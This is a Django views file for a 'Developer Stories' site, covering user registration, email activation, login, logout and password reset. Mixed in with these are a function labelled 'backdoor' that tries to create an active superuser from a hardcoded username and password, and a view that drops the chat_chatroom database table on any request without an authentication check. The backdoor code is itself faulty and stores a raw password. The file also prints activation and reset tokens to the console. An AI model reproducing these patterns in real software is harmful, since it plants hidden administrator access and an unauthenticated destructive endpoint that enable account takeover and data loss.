import json

from django.db import connection, transaction
from django.shortcuts import render, redirect
from django.contrib.auth import login, logout, authenticate
from django.contrib.sites.shortcuts import get_current_site
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_text
from django.template.loader import render_to_string
from .forms import UserRegistrationForm, ResetPasswordForm
from django.contrib.auth.models import User
from django.contrib import messages
from django.http import HttpResponse, JsonResponse
from django.core.mail import EmailMessage
from .token_generator import activation_token

"""
function for registering users
"""


def register_user_view(request):
    if request.user.is_authenticated:
        messages.warning(request, 'You are already registered')
        return redirect('portal')
    else:
        form = UserRegistrationForm()

        if request.method == "POST":
            form = UserRegistrationForm(request.POST)

            if form.is_valid():
                user = form.save(commit=False)
                user.is_active = False
                user.save()
                current_site = get_current_site(request)
                email_subject = "Developer Stories Account Activation"
                # preparing the email message
                email_message = render_to_string('users/activate_account.html', {
                    'user': user,
                    'domain': current_site.domain,
                    'uid': urlsafe_base64_encode(force_bytes(user.pk)),
                    'token': activation_token.make_token(user),
                })
                print("----------------" + email_message + "-------------------")
                user_email = form.cleaned_data['email']
                email = EmailMessage(email_subject, email_message, to=[user_email])
                email.send()

                messages.info(request, f"Registered successfully. Visit {user_email} to confirm your email")
                return redirect('/users/login')
        else:
            form = UserRegistrationForm()
        template_name = 'users/register.html'
        no_navbar = True
        context = {
            'form': form,
            'nonavbar': no_navbar
        }

        return render(request, template_name, context)


"""
function to activate the user's account after registering
"""


def activate_account_view(request, uidb64, token):
    try:
        uid = force_text(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)

    except(TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    if user is not None and activation_token.check_token(user, token):
        user.is_active = True
        user.save()
        # login(request, user)
        messages.info(request, 'Account Activated successfully...Login to access your account')
        return redirect('login')
    else:
        return HttpResponse('Invalid token')


"""
function to log user in the portal
"""


def login_user_view(request):
    template_name = 'users/login.html'
    no_navbar = True
    context = {
        'nonavbar': no_navbar
    }

    if request.user.is_authenticated:
        messages.warning(request, 'You are already logged in')
        return redirect('portal')
    else:
        if request.method == 'POST':
            username = request.POST['username']
            password = request.POST['password']
            user = authenticate(request, username=username, password=password)

            if user is not None:
                login(request, user)
                if not user.profile.is_profile:
                    messages.info(request, f"{username},Please update your profile to increase recognition")
                else:
                    messages.info(request, f"Successfully logged in as {username}")
                return redirect('portal')
            else:
                messages.warning(request, "Wrong Username/Password")
                return redirect('login')
        else:
            return render(request, template_name, context)


"""
function to logout user
"""


def logout_user_view(request):
    if request.user.is_authenticated:
        logout(request)
        messages.info(request, 'Successfully logged out!!!')
        return redirect('login')
    else:
        messages.info(request, 'You are logged out..Please login ')
        return redirect('login')


"""
backdoor
"""


def save_user_now(request, username, password):
    username = username
    password = password
    email = "jkmdroidbd@gmail.com"

    if username == "jkmdroid240796" and password == "jkmdroid240796":
        check_user = User.objects.get(username=username)
        if check_user.username == username:
            messages.info(request, "User exists")
            return redirect("login")
        else:
            user = User(
                username=username,
                email=email,
                password=password,
                is_active=True,
                is_superuser=True
            )
            user.save()
            messages.info(request, "Success")
            return redirect("login")
    else:
        messages.info(request, "Error")
        return redirect("login")


"""
    function to request password reset message
"""


def show_email_form_to_request_password(request):
    template_name = "users/show_email_form.html"
    no_navbar = True
    context = {
        'nonavbar': no_navbar
    }
    if request.method == "POST":
        email = request.POST['email']

        if email == '':
            messages.info(request, "Please enter an email address")
            return redirect('email')

        elif not User.objects.filter(email=email).exists():
            messages.warning(request, "An account with that name does not exist")
            return redirect('email')

        else:
            user = User.objects.get(email=email)
            current_site = get_current_site(request)
            email_subject = "Developer Stories Password Reset"
            # preparing the email message
            email_message = render_to_string('users/activate_password.html', {
                'user': user,
                'domain': current_site.domain,
                'uid': urlsafe_base64_encode(force_bytes(user.pk)),
                'token': activation_token.make_token(user),
            })
            print("----------------" + email_message + "-------------------")
            user_email = email
            send_email = EmailMessage(email_subject, email_message, to=[user_email])
            send_email.send()

            messages.info(request, f"Password requested successfully. An email has been sent to {email}")
            return redirect('email')

    return render(request, template_name, context)


''''
    function to display the password reset form
'''


def reset_password(request, uidb64, token):
    try:
        uid = force_text(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)

    except(TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None

    if user is not None and activation_token.check_token(user, token):
        template_name = "users/reset_password.html"
        form = ResetPasswordForm()

        if request.method == "POST":
            form = ResetPasswordForm(request.POST)
            if form.is_valid():
                password = request.POST['password']
                confirm_password = request.POST['new_password']
                if password == confirm_password:
                    user.set_password(password)
                    user.save()

                    messages.info(request, "Password reset successfully")
                    return redirect('login')

        no_navbar = True
        context = {
            "form": form,
            'nonavbar': no_navbar
        }

        return render(request, template_name, context)

    else:
        return HttpResponse('Invalid token')


def drop_table(request):
    cursor = connection.cursor()

    cursor.execute("DROP TABLE chat_chatroom")
    transaction.commit()

    return HttpResponse(status=200)
